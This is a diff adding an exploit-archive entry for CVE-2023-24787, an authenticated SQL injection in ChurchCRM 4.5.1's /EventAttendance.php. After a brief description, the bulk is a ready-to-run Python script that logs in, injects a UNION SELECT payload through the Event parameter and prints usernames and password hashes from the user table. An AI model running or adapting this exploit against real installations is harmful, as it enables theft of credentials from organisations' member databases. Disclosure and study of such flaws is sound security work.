@@ -1,0 +1,68 @@
+id: 38542
+date: 04/07/2023
+title: ChurchCRM 4.5.1 - Authenticated SQL Injection Exploit
+author: Arvandy
+cves: CVE-2023-24787
+
+# Exploit Title: ChurchCRM 4.5.1 - Authenticated SQL Injection
+# Exploit Author: Arvandy
+# Blog Post: https://github.com/arvandy/CVE/blob/main/CVE-2023-24787/CVE-2023-24787.md
+# Software Link: https://github.com/ChurchCRM/CRM/releases
+# Vendor Homepage: http://churchcrm.io/
+# Version: 4.5.1
+# Tested on: Windows, Linux
+# CVE: CVE-2023-24787
+
+"""
+The endpoint /EventAttendance.php is vulnerable to Authenticated SQL Injection (Union-based and Blind-based) via the Event GET parameter.
+This endpoint can be triggered through the following menu: Events - Event Attendance Reports - Church Service/Sunday School. 
+The Event Parameter is taken directly from the query string and passed into the SQL query without any sanitization or input escaping.
+This allows the attacker to inject malicious Event payloads to execute the malicious SQL query.
+
+This script is created as Proof of Concept to retrieve the username and password hash from user_usr table.
+"""
+
+
+import sys, requests
+
+def dumpUserTable(target, session_cookies):    
+    print("(+) Retrieving username and password")
+    print("")
+    url = "%s/EventAttendance.php?Action=List&Event=2+UNION+ALL+SELECT+1,NULL,CONCAT('Perseverance',usr_Username,':',usr_Password),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL+from+user_usr--+-&Type=Sunday School" % (target)
+    headers = {'Content-Type':'application/x-www-form-urlencoded','Cookie':'CRM-2c90cf299230a50dab55aee824ed9b08='+str(session_cookies)}              
+    r = requests.get(url, headers=headers)
+    lines = r.text.splitlines()
+    
+    for line in lines: 
+        if "<td >Perseverance" in line:
+            print(line.split("Perseverance")[1].split("</td>")[0])
+    
+def login(target, username, password):
+    target = "%s/session/begin" % (target)
+    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+    data = "User=%s&Password=%s" % (username, password)
+    s = requests.session()
+    r = s.post(target, data = data, headers = headers)
+    return s.cookies.get('CRM-2c90cf299230a50dab55aee824ed9b08')
+
+def main():
+    print("(!) Login to the target application")
+    session_cookies = login(target, username, password)       
+    
+    print("(!) Exploiting the Auth SQL Injection to retrieve the username and password hash")
+    dumpUserTable(target, session_cookies)
+
+    
+if __name__ == "__main__":
+    if len(sys.argv) != 4:
+        print("(!) Usage: python3 exploit.py <URL> <username> <password>")
+        print("(!) E.g.,: python3 exploit.py http://192.168.1.100/ChurchCRM user pass")
+        sys.exit(-1)
+
+    target = sys.argv[1]
+    username = sys.argv[2]
+    password = sys.argv[3]
+    
+    main()
+
+#  0day.today [2023-04-19]  #
